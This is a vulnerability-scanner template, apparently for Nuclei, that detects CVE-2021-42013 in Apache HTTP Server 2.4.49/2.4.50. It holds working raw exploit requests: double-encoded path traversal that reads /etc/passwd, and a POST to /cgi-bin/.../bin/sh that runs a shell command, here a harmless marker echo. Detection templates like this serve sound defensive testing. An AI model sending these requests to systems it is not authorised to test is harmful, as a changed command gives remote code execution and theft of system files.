id: CVE-2021-42013
info:
  name: Apache 2.4.49/2.4.50 - Path Traversal and Remote Code Execution
  author: nvn1729,0xd0ff9,666asd
  severity: critical
  description: A vulnerability in Apache HTTP Server 2.4.49 and 2.4.50 could allow
    attackers to perform path traversal attacks, potentially leading to remote code
    execution via unprotected files outside of the document root.
  reference:
  - https://httpd.apache.org/security/vulnerabilities_24.html
  - https://github.com/apache/httpd/commit/5c385f2b6c8352e2ca0665e66af022d6e936db6d
  - https://nvd.nist.gov/vuln/detail/CVE-2021-42013
  - https://twitter.com/itsecurityco/status/1446136957117943815
  remediation: Upgrade to Apache HTTP Server 2.4.51 or later.
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2021-42013
    cwe-id: CWE-22
  metadata:
    verified: 'true'
    impact: The impact of CVE-2021-42013 on Apache HTTP Server 2.4.49 and 2.4.50 is
      that an attacker can exploit a path traversal vulnerability to access files
      outside of the document root, potentially leading to remote code execution.
    recommendation: It is recommended that users upgrade to versions of Apache HTTP
      Server higher than 2.4.50 to mitigate the vulnerabilities associated with CVE-2021-42013.
  tags: cve,cve2021,lfi,apache,rce,misconfig,traversal,kev
variables:
  cmd: echo COP-37714-1202-EVC | rev
requests:
- raw:
  - 'GET /icons/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd
    HTTP/1.1

    Host: {{Hostname}}

    Origin: {{BaseURL}}


    '
  - 'GET /icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd
    HTTP/1.1

    Host: {{Hostname}}

    Origin: {{BaseURL}}


    '
  - 'POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh
    HTTP/1.1

    Host: {{Hostname}}

    Origin: {{BaseURL}}

    Content-Type: application/x-www-form-urlencoded


    echo Content-Type: text/plain; echo; {{cmd}}


    '
  stop-at-first-match: true
  unsafe: true
  matchers-condition: or
  matchers:
  - type: regex
    name: LFI
    regex:
    - 'root:.*:0:0:'
  - type: word
    name: RCE
    words:
    - CVE-2021-42013
